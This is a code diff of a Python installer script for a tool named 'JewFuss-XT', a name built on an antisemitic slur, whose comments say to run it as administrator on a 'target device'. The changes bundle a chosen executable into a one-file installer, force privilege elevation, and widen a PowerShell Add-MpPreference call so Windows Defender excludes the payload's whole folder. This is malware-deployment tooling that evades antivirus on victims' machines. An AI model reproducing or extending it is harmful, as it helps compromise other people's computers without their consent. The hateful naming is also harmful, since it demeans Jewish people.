@@ -24,12 +24,10 @@ os.chdir(SCRIPT_DIR)
 # using this requires a bit of setup, first complie jewfuss-xt and leave it in the builds folder
 # than compile this script using the command above, and run it the output exe as as adminastrator on target device
 
-# also you are god damn right chatGPT made most of this (nost really just means the inital verison), I don't have the time nor knolage on scheduling tasks using commands
-
 # Define the target directory and name of bundled executable to run
 
 try:
-    if os.path.splitext(sys.argv[0])[1].lower() == ".py":  # Compile if running as .py
+    if os.path.splitext(sys.argv[0])[1].lower() != ".exe":  # Compile if running as .py
         parser = argparse.ArgumentParser()
         parser.add_argument('--file', type=str, default=None)
         parser.add_argument('--icon', type=str, default=None)
@@ -37,32 +35,32 @@ try:
         args = parser.parse_args()
         
         if args.icon is not None:
-            appicon = f'--icon "{args.icon}"'
+            installer_icon = f'--icon "{args.icon}"'
         else:
-            appicon = ""
-            
-        if args.name is not None:
-            appname = f'--name "{args.name.removesuffix(".exe")}"'
-        else:
-            appname = ""
+            installer_icon = ""
         
         if args.file == None:
-            app_name = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
+            input_exe = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
         else:
             print(f'Using provided file: "{args.file}"')
-            app_name = args.file
+            input_exe = args.file
             
-        if not app_name:
-            app_name = "JewFuss-XT.exe"
+        if not input_exe:
+            input_exe = "JewFuss-XT.exe"
 
-        while not os.path.exists(f"builds/{app_name}"):
-            app_name = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
+        while not os.path.exists(f"builds/{input_exe}"):
+            input_exe = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
         
         temp_file_path = "executablename.txt"
         with open(temp_file_path, "w") as f:
-            f.write(app_name)
+            f.write(input_exe)
+            
+        if args.name is not None:
+            installer_name = f'--name "{args.name}"'
+        else:
+            installer_name = f'--name "{input_exe.removesuffix(".exe")}-installer"'
 
-        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{app_name};." --add-data="{temp_file_path};." --distpath=builds --workpath=data {appname} {appicon} {sys.argv[0]}')
+        os.system(f'cd {os.path.dirname(os.path.abspath(sys.argv[0]))} && pyinstaller --onefile --add-binary="builds/{input_exe};." --add-data="{temp_file_path};." --distpath=builds --workpath=data {installer_name} {installer_icon} {sys.argv[0]}')
         os.remove(temp_file_path)
         sys.exit("\nFinished compiling")
 
@@ -72,6 +70,11 @@ except KeyboardInterrupt:
 except Exception as e:
     print(f"Error compiling: {e}")
     errored = True
+
+PyElevate.elevate()
+if not PyElevate.elevated():
+    ctypes.windll.user32.MessageBoxW(0, "Please run as administrator.", "Permissions error", 0x10)
+    sys.exit(0)
 
 if getattr(sys, 'frozen', False):
     base_path = sys._MEIPASS
@@ -90,9 +93,11 @@ errored = False # Don't change
 def add_defender_exclusion(file_path):
     global errored
     try:
-        defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{file_path}\\""'
+        folder = os.path.dirname(file_path)
+        defender_command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""'
         subprocess.run(defender_command, shell=True, check=True)
-        if printnonerrors: print(f"Windows Defender exclusion added for {file_path}")
+        if printnonerrors:
+            print(f"Windows Defender exclusion added for {folder}")
     except subprocess.CalledProcessError as e:
         print(f"Error adding Defender exclusion: {e}")
         errored = True
